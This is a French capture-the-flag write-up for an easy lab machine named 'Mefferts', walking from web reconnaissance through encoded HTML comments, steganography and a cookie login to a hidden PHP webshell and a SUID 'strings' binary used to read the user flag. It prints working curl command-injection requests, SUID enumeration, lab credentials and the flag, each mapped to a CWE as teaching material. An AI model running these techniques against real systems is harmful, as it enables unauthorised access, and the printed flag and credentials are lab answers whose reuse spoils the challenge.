# Write-up : "Mefferts"

**Cible :** 10.10.0.22 (l'IP change à chaque redéploiement : aussi vue en .8 / .73)

**Objectif :** Obtenir user.txt

**Difficulté :** Easy

**Date :** 15/09/2026

**Techniques utilisées :** Reconnaissance web, énumération de commentaires HTML, décodage multi-couches (Base64 / Base32 / hex), stéganographie (steghide), authentification par formulaire + cookie, RCE via webshell caché

**Outils utilisés :** nmap, curl, base64, base32, xxd, wget, steghide

---

## 1. Reconnaissance réseau (Nmap)

**Commande :**

```bash
nmap -sV -p- 10.10.0.22
```

**Pourquoi :** identifier les services exposés avant toute exploitation.

**Résultat :**

- `22/tcp` : SSH
- `80/tcp` : HTTP (Apache 2.4.68) → c'est du web, on attaque par là.

---

## 2. Exploration de la page web principale

**Commande :**

```bash
curl -s http://10.10.0.22/
```

**Résultat :** deux commentaires cachés dans le code source :

```html
<!--Note to self - Recover your password at /recovery.php! -->
<!-- VGhlIGJhY2t1cCBwYXNzd2QgaXMgaGVyZSwgdXNlIGl0IGluIGxhc3QgcmVzb3J0... -->
```

**Faille exploitée :** Exposition d'informations sensibles dans le code source (CWE-200) — un commentaire de dev révèle un chemin caché et un secret encodé.

---

## 3. Décodage du premier secret (Base64)

**Commande :**

```bash
echo 'VGhlIGJhY2t1cCBwYXNzd2QgaXMgaGVyZSwgdXNlIGl0IGluIGxhc3QgcmVzb3J0LCBpbiBjYXNlIHlvdSBuZWVkIGEga2V5IG9yIHNvbWV0aGluZzogNVVjaF80X0czbjF1NV9jUjM0VG9S' | base64 -d ; echo
```

**Résultat :**

```
The backup passwd is here, use it in last resort, in case you need a key or something: 5Uch_4_G3n1u5_cR34ToR
```

→ On garde ce mot de passe : **`5Uch_4_G3n1u5_cR34ToR`**.

---

## 4. La page de récupération (/recovery.php)

**Commande :**

```bash
curl -s http://10.10.0.22/recovery.php
```

**Résultat :** un formulaire de login + un `<h1>Hello Uwe!</h1>` (→ le user est probablement **Uwe**) et un commentaire encodé :

```html
<!-- R1U0VE1aUlhHVVpEQU5SV0daVERPTVJXRzQzR01OWlVH...  -->
```

**Décodage (Base32 → hex) :**

```bash
echo 'R1U0VE1aUlhHVVpEQU5SV0daVERPTVJXRzQzR01OWlVH...' | base64 -d | base32 -d | xxd -r -p ; echo
```

**Résultat :**

```
You forgot again didnt you? remember: the cubes are the keys to everything
```

→ Indice : **les cubes (images) contiennent la clé**.

---

## 5. Stéganographie sur les images de cubes

**Récupération des images :**

```bash
cd /tmp
wget http://10.10.0.22/assets/cube_barrel.jpg
# ... + les autres cubes (cube_gold.jpg, etc.)
```

**Extraction avec le mot de passe trouvé à l'étape 3 :**

```bash
steghide extract -sf cube_gold.jpg -p 5Uch_4_G3n1u5_cR34ToR
```

- `-sf` = fichier source (l'image), `-p` = passphrase.

**Faille exploitée :** Données sensibles cachées par stéganographie avec un secret réutilisé (CWE-311 / mauvaise gestion de secrets).

**Résultat :** 4 cubes ne contenaient rien (`could not extract any data`), mais **`cube_gold.jpg`** cachait un fichier `passwd` :

```bash
cat passwd
# Username: uweThePuzzleMaster
# Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
```

---

## 6. Authentification sur le formulaire de récupération

**Commande :**

```bash
curl -i http://10.10.0.22/recovery.php -d "user=uweThePuzzleMaster&pass=i_W4N7_70_C0Ll3C7_4Ll_Pu22l35"
```

- `-i` = affiche les en-têtes (dont `Location` et `Set-Cookie`), `-d` = envoie le formulaire en POST.

**Résultat :**

```
HTTP/1.1 302 Found
Set-Cookie: login=uwe%3Athisisnotevennecessary; ...
location: /my_very_secret_dir/index.php
```

→ redirection vers un répertoire secret + un cookie de session `login`.

---

## 7. Accès au répertoire secret (cookie requis)

**Commande :**

```bash
curl -s http://10.10.0.22/my_very_secret_dir/index.php -b "login=uwe:thisisnotevennecessary"
```

- `-b` = envoie le cookie obtenu à l'étape précédente (sans lui → accès refusé).

**Résultat :** `Secret Page, don't share! GET me a cmd and we'll talk!` avec une balise `<pre>` vide → la page attend un paramètre `cmd`.

---

## 8. Exécution de commandes distante (RCE)

**Commande :**

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=id" -b "login=uwe:thisisnotevennecessary"
```

**Résultat :** `uid=33(www-data)` → **RCE confirmée**(RCE= Remote code execution).

En lisant le source :

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=cat index.php" -b "login=uwe:thisisnotevennecessary"
# → system($_GET['cmd']);
```

**Faille exploitée :** Exécution de commandes système via un paramètre non filtré (CWE-78 : OS Command Injection).

> Petite note : dans une URL, l'espace s'écrit `%20`, le `>` s'écrit `%3E`.

---

## 9. Exploration du système

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=ls /home" -b "login=uwe:thisisnotevennecessary"
# → uwe   uwe_passwords
```

`uwe_passwords` s'est révélé être une **fausse piste** (juste une ref à Astérix).

---

## 10. Contournement des permissions via binaire SUID

`www-data` ne peut pas lire `/home/uwe/user.txt`. On cherche un binaire SUID root :

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=find / -perm -4000 -type f 2>/dev/null" -b "login=uwe:thisisnotevennecessary"
```

**Résultat :** `/usr/bin/x86_64-linux-gnu-strings` — un `strings` en SUID root, ce qui n'est **pas normal**.

**Faille exploitée :** Binaire SUID root permettant la lecture de fichiers arbitraires (CWE-732 : Incorrect Permission Assignment).

**Lecture du flag via ce binaire :**

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=/usr/bin/x86_64-linux-gnu-strings /home/uwe/user.txt" -b "login=uwe:thisisnotevennecessary"
```

**FLAG obtenu :**

```
EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}
```

---

## Résumé des failles exploitées

| #   | Faille                                                | Catégorie (CWE) |
| --- | ----------------------------------------------------- | --------------- |
| 1   | Secrets en commentaires HTML (chemin + mot de passe)  | CWE-200         |
| 2   | Obfuscation faible (Base64/Base32/hex)                | CWE-311         |
| 3   | Identifiants cachés par stéganographie (steghide)     | CWE-311         |
| 4   | Cookie d'authentification trivial                     | CWE-565         |
| 5   | Webshell exposé (`system($_GET['cmd'])`)              | CWE-78 (RCE)    |
| 6   | Binaire SUID root `strings`                           | CWE-732         |

---

## Chaîne d'exploitation (résumé visuel)

```
Commentaire HTML → /recovery.php + secret Base64
        │
        ▼
Mot de passe steghide (5Uch_4_G3n1u5_cR34ToR)
        │
        ▼
Indice "the cubes are the keys" → steghide sur cube_gold.jpg
        │
        ▼
Creds uweThePuzzleMaster : i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
        │
        ▼
POST /recovery.php → cookie login → /my_very_secret_dir/index.php
        │
        ▼
?cmd=  → RCE en www-data
        │
        ▼
SUID strings → lecture /home/uwe/user.txt → FLAG
```

---

## Conclusion

- **Accès initial :** énumération web (commentaires HTML) → décodage multi-couches → stéganographie sur `cube_gold.jpg`.
- **Accès applicatif :** authentification `/recovery.php` → cookie → webshell caché → RCE en `www-data`.
- **Lecture du flag :** abus du binaire SUID `strings` pour lire un fichier interdit.
- **Flag user :** `EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}`
